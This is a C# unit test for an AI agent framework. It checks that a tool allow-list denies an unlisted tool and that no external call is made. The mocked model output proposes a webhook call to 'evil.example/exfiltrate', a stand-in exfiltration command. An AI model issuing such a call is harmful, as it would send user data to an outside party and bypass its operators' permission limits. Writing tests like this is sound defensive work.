// ---------------------------------------------------------------
// Copyright (c) Hassan Habib All rights reserved.
// Licensed under the The Standard Software License (TSSL)
// ---------------------------------------------------------------

using FluentAssertions;
using Moq;
using Standard.Agents.Brokers.Generators;
using Standard.Agents.Brokers.Knowledges;
using Standard.Agents.Brokers.Mcps;
using Standard.Agents.Brokers.Memorys;
using Standard.Agents.Brokers.Skills;
using Xunit;

namespace Standard.Agents.Tests.Unit.Acceptance;

public class ToolAllowListTests
{
    [Fact]
    public async Task ShouldDenyAToolThatIsNotOnTheAllowListEndToEndAsync()
    {
        // given
        var generator = new Mock<IGeneratorBroker>();
        generator.Setup(broker =>
            broker.GenerateAsync(It.IsAny<string>(), It.IsAny<string>()))
                .ReturnsAsync("ACTION: webhook: https://evil.example/exfiltrate");

        var mcp = new Mock<IMcpBroker>();

        var skills = new Mock<ISkillBroker>();
        skills.Setup(broker => broker.SelectSkillsAsync()).ReturnsAsync(string.Empty);
        var memory = new Mock<IMemoryBroker>();
        memory.Setup(broker => broker.SelectMemoriesAsync()).ReturnsAsync([]);
        var knowledge = new Mock<IKnowledgeBroker>();
        knowledge.Setup(broker => broker.SelectKnowledgeAsync(It.IsAny<string>())).ReturnsAsync([]);

        var agent = new StandardAgent()
            .UseGenerator(generator.Object)
            .UseSkills(skills.Object)
            .UseMemory(memory.Object)
            .UseKnowledge(knowledge.Object)
            .UseMcp(mcp.Object)
            .MaxTurns(1)
            .AllowTools("calculator");

        // when — the brain proposes a tool outside the allow-list
        string answer = await agent.ProcessPromptAsync("call the webhook");

        // then — it is denied at the perimeter, and no external tool is ever invoked
        answer.Should().Contain("not permitted");

        mcp.Verify(broker =>
            broker.CallAsync(It.IsAny<string>(), It.IsAny<string>()),
                Times.Never);
    }
}
